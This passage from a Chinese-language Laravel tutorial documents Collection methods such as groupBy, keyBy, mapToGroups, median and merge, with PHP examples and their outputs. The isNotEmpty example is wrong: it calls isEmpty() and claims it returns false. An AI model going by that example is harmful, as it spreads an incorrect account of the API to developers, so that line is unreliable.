class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'framework'</span> =&gt; <span class="string">'laravel'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;get(<span class="string">'email'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'boo'</span>;</span><br><span class="line">&#125;); <span class="comment">// boo</span></span><br></pre></td></tr></table></figure><h3 id="groupBy"><a href="#groupBy" class="headerlink" title="groupBy"></a>groupBy</h3><p>根据给定的键对集合内的项目进行分组。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="string">'account-x10'</span>, <span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>],</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="string">'account-x10'</span>, <span class="string">'product'</span> =&gt; <span class="string">'Bookcase'</span>],</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="string">'account-x11'</span>, <span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$grouped = $collection-&gt;groupBy(<span class="string">'account_id'</span>);</span><br><span class="line"></span><br><span class="line">$grouped-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'account-x10' =&gt; [</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'],</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'account-x11' =&gt; [</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>同样可以传入一个回调函数来代替字符串的『键』，根据该回调函数的返回值来进行分组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$grouped = $collection-&gt;groupBy(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> substr($item[<span class="string">'account_id'</span>], <span class="number">-3</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$grouped-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'x10' =&gt; [</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'],</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'x11' =&gt; [</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>甚至可以传入一个数组进行多层分组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">new</span> Collection([</span><br><span class="line">    <span class="number">10</span> =&gt; [<span class="string">'user'</span> =&gt; <span class="number">1</span>, <span class="string">'skill'</span> =&gt; <span class="number">1</span>, <span class="string">'roles'</span> =&gt; [<span class="string">'Role_1'</span>, <span class="string">'Role_3'</span>]],</span><br><span class="line">    <span class="number">20</span> =&gt; [<span class="string">'user'</span> =&gt; <span class="number">2</span>, <span class="string">'skill'</span> =&gt; <span class="number">1</span>, <span class="string">'roles'</span> =&gt; [<span class="string">'Role_1'</span>, <span class="string">'Role_2'</span>]],</span><br><span class="line">    <span class="number">30</span> =&gt; [<span class="string">'user'</span> =&gt; <span class="number">3</span>, <span class="string">'skill'</span> =&gt; <span class="number">2</span>, <span class="string">'roles'</span> =&gt; [<span class="string">'Role_1'</span>]],</span><br><span class="line">    <span class="number">40</span> =&gt; [<span class="string">'user'</span> =&gt; <span class="number">4</span>, <span class="string">'skill'</span> =&gt; <span class="number">2</span>, <span class="string">'roles'</span> =&gt; [<span class="string">'Role_2'</span>]],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$result = $data-&gt;groupBy([</span><br><span class="line">    <span class="string">'skill'</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $item[<span class="string">'roles'</span>];</span><br><span class="line">    &#125;,</span><br><span class="line">], $preserveKeys = <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[</span></span><br><span class="line"><span class="comment">    1 =&gt; [</span></span><br><span class="line"><span class="comment">        'Role_1' =&gt; [</span></span><br><span class="line"><span class="comment">            10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']],</span></span><br><span class="line"><span class="comment">            20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'Role_2' =&gt; [</span></span><br><span class="line"><span class="comment">            20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'Role_3' =&gt; [</span></span><br><span class="line"><span class="comment">            10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">    ],</span></span><br><span class="line"><span class="comment">    2 =&gt; [</span></span><br><span class="line"><span class="comment">        'Role_1' =&gt; [</span></span><br><span class="line"><span class="comment">            30 =&gt; ['user' =&gt; 3, 'skill' =&gt; 2, 'roles' =&gt; ['Role_1']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'Role_2' =&gt; [</span></span><br><span class="line"><span class="comment">            40 =&gt; ['user' =&gt; 4, 'skill' =&gt; 2, 'roles' =&gt; ['Role_2']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">    ],</span></span><br><span class="line"><span class="comment">];</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="has"><a href="#has" class="headerlink" title="has"></a>has</h3><p>判断集合中是否存在给定的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">"name"</span> =&gt; <span class="string">"boo"</span>, <span class="string">"age"</span> =&gt; <span class="number">25</span>]);</span><br><span class="line">$collection-&gt;has(<span class="string">"name"</span>);  <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="implode"><a href="#implode" class="headerlink" title="implode"></a>implode</h3><p>合并集合中的项目。</p><p>implode 方法用于合并集合项。其参数取决于集合项的类型。如果集合包含数组或对象，你应该传递你希望合并的属性的键，以及你希望放在值之间用来「拼接」的字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="number">1</span>, <span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>],</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="number">2</span>, <span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;implode(<span class="string">'product'</span>, <span class="string">', '</span>);</span><br><span class="line"><span class="comment">// Desk, Chair</span></span><br></pre></td></tr></table></figure><p>如果集合中包含简单的字符串或数值，只需要传入「拼接」用的字符串作为该方法的唯一参数即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])-&gt;implode(<span class="string">'-'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// '1-2-3-4-5'</span></span><br></pre></td></tr></table></figure><h3 id="intersect"><a href="#intersect" class="headerlink" title="intersect"></a>intersect</h3><p>从原集合中移除不在给定数组或集合中的『任何值』，返回新的集合将保留原集合的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'Desk'</span>, <span class="string">'Sofa'</span>, <span class="string">'Chair'</span>]);</span><br><span class="line">$intersect = $collection-&gt;intersect([<span class="string">'Desk'</span>, <span class="string">'Chair'</span>, <span class="string">'Bookcase'</span>]);</span><br><span class="line">$intersect-&gt;all();</span><br><span class="line"><span class="comment">// [0 =&gt; 'Desk', 2 =&gt; 'Chair']</span></span><br></pre></td></tr></table></figure><h3 id="intersectKey"><a href="#intersectKey" class="headerlink" title="intersectKey"></a>intersectKey</h3><p>删除原集合中不存在于给定数组或集合中的『任何键』，返回新的集合将保留原集合的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="string">'serial'</span> =&gt; <span class="string">'UX301'</span>, <span class="string">'type'</span> =&gt; <span class="string">'screen'</span>, <span class="string">'year'</span> =&gt; <span class="number">2009</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$intersect = $collection-&gt;intersectByKeys([</span><br><span class="line">    <span class="string">'reference'</span> =&gt; <span class="string">'UX404'</span>, <span class="string">'type'</span> =&gt; <span class="string">'tab'</span>, <span class="string">'year'</span> =&gt; <span class="number">2011</span>,</span><br><span class="line">]);</span><br><span class="line">$intersect-&gt;all();</span><br><span class="line"><span class="comment">// ['type' =&gt; 'screen', 'year' =&gt; 2009]</span></span><br></pre></td></tr></table></figure><h3 id="isEmpty"><a href="#isEmpty" class="headerlink" title="isEmpty"></a>isEmpty</h3><p>判断集合是否为空。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([])-&gt;isEmpty(); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="isNotEmpty"><a href="#isNotEmpty" class="headerlink" title="isNotEmpty"></a>isNotEmpty</h3><p>判断集合是否不为空。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([])-&gt;isEmpty(); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><p>将集合中的值用字符串连接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>])-&gt;join(<span class="string">', '</span>); <span class="comment">// 'a, b, c'</span></span><br><span class="line">collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>])-&gt;join(<span class="string">', '</span>, <span class="string">', and '</span>); <span class="comment">// 'a, b, and c'</span></span><br><span class="line">collect([<span class="string">'a'</span>, <span class="string">'b'</span>])-&gt;join(<span class="string">', '</span>, <span class="string">' and '</span>); <span class="comment">// 'a and b'</span></span><br><span class="line">collect([<span class="string">'a'</span>])-&gt;join(<span class="string">', '</span>, <span class="string">' and '</span>); <span class="comment">// 'a'</span></span><br><span class="line">collect([])-&gt;join(<span class="string">', '</span>, <span class="string">' and '</span>); <span class="comment">// ''</span></span><br></pre></td></tr></table></figure><h3 id="keyBy"><a href="#keyBy" class="headerlink" title="keyBy"></a>keyBy</h3><p>以给定的键作为集合的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product_id'</span> =&gt; <span class="string">'prod-100'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>],</span><br><span class="line">    [<span class="string">'product_id'</span> =&gt; <span class="string">'prod-200'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Chair'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$keyed = $collection-&gt;keyBy(<span class="string">'product_id'</span>);</span><br><span class="line"></span><br><span class="line">$keyed-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'prod-100' =&gt; ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'],</span></span><br><span class="line"><span class="comment">        'prod-200' =&gt; ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>还可以在这个方法传递一个回调函数。该回调函数返回的值会作为该集合的键：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$keyed = $collection-&gt;keyBy(<span class="function"><span class="keyword">function</span> <span class="params">($item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strtoupper($item[<span class="string">'product_id'</span>]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$keyed-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'PROD-100' =&gt; ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'],</span></span><br><span class="line"><span class="comment">        'PROD-200' =&gt; ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="keys"><a href="#keys" class="headerlink" title="keys"></a>keys</h3><p>返回集合的所有键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">"name"</span> =&gt; <span class="string">"boo"</span>, <span class="string">"age"</span> =&gt; <span class="number">25</span>]);</span><br><span class="line">$collection-&gt;keys()-&gt;all();  <span class="comment">// ["name", "age"]</span></span><br></pre></td></tr></table></figure><h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><p>返回集合中通过给定真实测试的最后一个元素，与<code>first</code> 方法正好相反。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])-&gt;last(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $value &lt; <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>还可以调用无参的 last 方法来获取集合的最后一个元素。如果集合为空。返回 null：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])-&gt;last();</span><br><span class="line"><span class="comment">// 4</span></span><br></pre></td></tr></table></figure><h3 id="macro"><a href="#macro" class="headerlink" title="macro"></a>macro</h3><p>静态 <code>macro</code> 方法允许你在运行时添加方法到 <code>Collection</code> 类，更多细节可以查看扩展集合部分文档。</p><h3 id="make"><a href="#make" class="headerlink" title="make"></a>make</h3><p>静态 <code>make</code> 方法会创建一个新的集合实例，细节可查看创建集合部分文档。</p><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>遍历集合并将每一个值传入给定的回调，返回新的集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$multiplied = $collection-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $item * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$multiplied-&gt;all();</span><br><span class="line"><span class="comment">// [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure><p>与其他大多数集合方法一样， map 会返回一个新的集合实例；它不会修改原集合。如果你想修改原集合，请使用 <code>transform</code> 方法。</p><h3 id="mapSpread"><a href="#mapSpread" class="headerlink" title="mapSpread"></a>mapSpread</h3><p>迭代集合项，传递每个嵌套集合项值到给定回调。在回调中我们可以修改集合项并将其返回，从而通过修改的值组合成一个新的集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">$chunks = $collection-&gt;chunk(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">$sequence = $chunks-&gt;mapSpread(<span class="function"><span class="keyword">function</span> <span class="params">($odd, $even)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $odd + $even;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$sequence-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">// [1, 5, 9, 13, 17]</span></span><br></pre></td></tr></table></figure><h3 id="mapToGroups"><a href="#mapToGroups" class="headerlink" title="mapToGroups"></a>mapToGroups</h3><p>通过指定回调函数对集合进行分组，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'John Doe'</span>,</span><br><span class="line">        <span class="string">'department'</span> =&gt; <span class="string">'Sales'</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Jane Doe'</span>,</span><br><span class="line">        <span class="string">'department'</span> =&gt; <span class="string">'Sales'</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Johnny Doe'</span>,</span><br><span class="line">        <span class="string">'department'</span> =&gt; <span class="string">'Marketing'</span>,</span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$grouped = $collection-&gt;mapToGroups(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [$item[<span class="string">'department'</span>] =&gt; $item[<span class="string">'name'</span>]];</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$grouped-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'Sales' =&gt; ['John Doe', 'Jane Doe'],</span></span><br><span class="line"><span class="comment">        'Marketing' =&gt; ['Johnny Doe'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$grouped-&gt;get(<span class="string">'Sales'</span>)-&gt;all();</span><br><span class="line"><span class="comment">// ['John Doe', 'Jane Doe']</span></span><br></pre></td></tr></table></figure><h3 id="mapWithKeys"><a href="#mapWithKeys" class="headerlink" title="mapWithKeys"></a>mapWithKeys</h3><p>对集合进行迭代并传递每个值到给定回调，该回调会返回包含键值对的关联数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'John'</span>,</span><br><span class="line">        <span class="string">'department'</span> =&gt; <span class="string">'Sales'</span>,</span><br><span class="line">        <span class="string">'email'</span> =&gt; <span class="string">'john@example.com'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Jane'</span>,</span><br><span class="line">        <span class="string">'department'</span> =&gt; <span class="string">'Marketing'</span>,</span><br><span class="line">        <span class="string">'email'</span> =&gt; <span class="string">'jane@example.com'</span></span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$keyed = $collection-&gt;mapWithKeys(<span class="function"><span class="keyword">function</span> <span class="params">($item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [$item[<span class="string">'email'</span>] =&gt; $item[<span class="string">'name'</span>]];</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$keyed-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[</span></span><br><span class="line"><span class="comment">    'john<span class="doctag">@example</span>.com' =&gt; 'John',</span></span><br><span class="line"><span class="comment">    'jane<span class="doctag">@example</span>.com' =&gt; 'Jane',</span></span><br><span class="line"><span class="comment">]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="max"><a href="#max" class="headerlink" title="max"></a>max</h3><p>返回指定键的最大值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$max = collect([[<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">20</span>]])-&gt;max(<span class="string">'foo'</span>);   <span class="comment">// 20</span></span><br><span class="line">$max = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])-&gt;max();   <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h3 id="median"><a href="#median" class="headerlink" title="median"></a>median</h3><p>返回指定键的中间值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$median = collect([[<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">20</span>], [<span class="string">'foo'</span> =&gt; <span class="number">40</span>]])-&gt;median(<span class="string">'foo'</span>);   <span class="comment">// 15</span></span><br><span class="line">$median = collect([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>])-&gt;median();  <span class="comment">// 1.5</span></span><br></pre></td></tr></table></figure><h3 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h3><p>将给定数组或集合合并到原集合。</p><p>如果给定的集合项的字符串键与原集合中的字符串键相匹配，则指定集合项的值将覆盖原集合的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="number">1</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>]);</span><br><span class="line">$merged = $collection-&gt;merge([<span class="string">'price'</span> =&gt; <span class="number">200</span>, <span class="string">'discount'</span> =&gt; <span class="keyword">false</span>]);</span><br><span class="line">$merged-&gt;all();</span><br><span class="line"><span class="comment">// ['product_id' =&gt; 1, 'price' =&gt; 200, 'discount' =&gt; false]</span></span><br></pre></td></tr></table></figure><p>如果给定的集合项为数字，则这些值将会追加在集合的最后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection &#x3D; collect([&#39;Desk&#39;, &#39;Chair&#39;]);</span><br><span class="line">$merged &#x3D; $collection-&gt;merge([&#39;Bookcase&#39;, &#39;Door&#39;]);</span><br><span class="line">$merged-&gt;all();</span><br><span class="line">&#x2F;&#x2F; [&#39;Desk&#39;, &#39;Chair&#39;, &#39;Bookcase&#39;, &#39;Door&#39;]</span><br></pre></td></tr></table></figure><h3 id="min"><a href="#min" class="headerlink" title="min"></a>min</h3><p>返回指定键的最小值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$min = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])-&gt;min();     <span class="comment">// 